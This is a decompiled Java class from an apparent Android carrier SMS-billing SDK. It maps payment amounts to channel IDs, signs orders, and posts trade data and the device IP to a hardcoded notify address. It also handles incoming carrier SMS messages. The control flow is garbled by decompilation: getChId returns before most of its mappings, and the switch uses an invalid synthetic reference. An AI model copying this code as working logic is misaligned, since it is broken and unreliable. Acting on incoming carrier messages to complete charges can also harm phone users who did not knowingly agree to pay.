package com.upay.billing.engine.rdosms;

import android.annotation.SuppressLint;
import android.util.Log;
import com.upay.billing.MtContext;
import com.upay.billing.UpayCore;
import com.upay.billing.bean.Cmd;
import com.upay.billing.bean.Op;
import com.upay.billing.bean.Trade;
import com.upay.billing.engine.CommonEngine;
import com.upay.billing.utils.HttpRunner;
import com.upay.billing.utils.Json;
import com.upay.billing.utils.Util;
import java.util.List;

public class Main
  extends CommonEngine
{
  private static final String TAG = "rdosms--Main";
  
  public Main() {}
  
  public static String getAmount(String paramString)
  {
    return String.valueOf(Integer.valueOf(paramString).intValue() * 100);
  }
  
  public String getChId(String paramString)
  {
    if ("100".equals(paramString)) {
      paramString = "1";
    }
    boolean bool;
    do
    {
      return paramString;
      if ("200".equals(paramString)) {
        return "2";
      }
      if ("400".equals(paramString)) {
        return "4";
      }
      if ("600".equals(paramString)) {
        return "6";
      }
      if ("800".equals(paramString)) {
        return "154";
      }
      if ("1000".equals(paramString)) {
        return "156";
      }
      if ("1200".equals(paramString)) {
        return "358";
      }
      if ("2000".equals(paramString)) {
        return "158";
      }
      bool = "3000".equals(paramString);
      paramString = null;
    } while (!bool);
    return "159";
  }
  
  public Op getOp()
  {
    return Op.CMCC;
  }
  
  public boolean hasCustomConfirmUi()
  {
    return false;
  }
  
  public boolean isAvailable(Op paramOp, boolean paramBoolean1, boolean paramBoolean2, boolean paramBoolean3, boolean paramBoolean4)
  {
    Boolean localBoolean = Boolean.valueOf(false);
    if (paramOp.equals(Op.CMCC)) {
      localBoolean = Boolean.valueOf(true);
    }
    return (localBoolean.booleanValue()) && (paramBoolean1) && (paramBoolean2);
  }
  
  @SuppressLint({"DefaultLocale"})
  public int onMtAction(MtContext paramMtContext, Json paramJson, String paramString1, String paramString2, String[] paramArrayOfString)
  {
    Log.i("rdosms--Main", "onMtAction: exec=" + paramJson.asObject() + ",mtNum=" + paramString1 + ",mtMsg=" + paramString2);
    switch (Main.2.$SwitchMap$com$upay$billing$engine$rdosms$Main$ExecType[Main.ExecType.valueOf(paramJson.getStr("type").toUpperCase()).ordinal()])
    {
    default: 
      return 0;
    case 1: 
      return 524288;
    case 2: 
      return 65736;
    }
    return 0x10000 | paramJson.getInt("code");
  }
  
  public void pay(Trade paramTrade, List paramList)
  {
    String str1 = ((Cmd)paramList.get(0)).msg.replace("$serialNo", paramTrade.id + "01");
    String str2 = getChId(getAmount(String.valueOf(paramTrade.price)));
    String str3 = paramTrade.id;
    String str4 = Util.getUnixTime();
    String str5 = Util.md5(RdoSmsConstant.createSign(this.core.getContext(), getAmount(String.valueOf(paramTrade.price)), str1, str4, str3, str2));
    Cmd localCmd = (Cmd)paramList.get(0);
    String str6 = paramTrade.getSubTrade(localCmd.key).getStr("sn");
    Json localJson = Json.createObject(new Object[] { "trade_id", paramTrade.id, "goods_key", paramTrade.goodsKey, "cmd_key", ((Cmd)paramList.get(0)).key, "bt_key", this.key, "sn", str6, "response", "" });
    Util.addTask(new Main.1(this, RdoSmsConstant.createUrl, paramTrade, str6, paramList, localJson, localCmd).setDoPost().addParam("amount", getAmount(String.valueOf(paramTrade.price))).addParam("app_id", "1000011").addParam("app_orderid", str1).addParam("ch_id", str2).addParam("ch_type", "1").addParam("corp_type", "1").addParam("ip", Util.getIp(this.core.getContext())).addParam("noti_url", "http://117.135.131.209:808/baidurdo/noti_url.php").addParam("ret_url", "http://117.135.131.209:808/baidurdo/noti_url.php").addParam("scheme", "3").addParam("site_type", "1").addParam("time", str4).addParam("user_id", str3).addParam("ver", "1.0").addParam("sign", str5));
  }
}
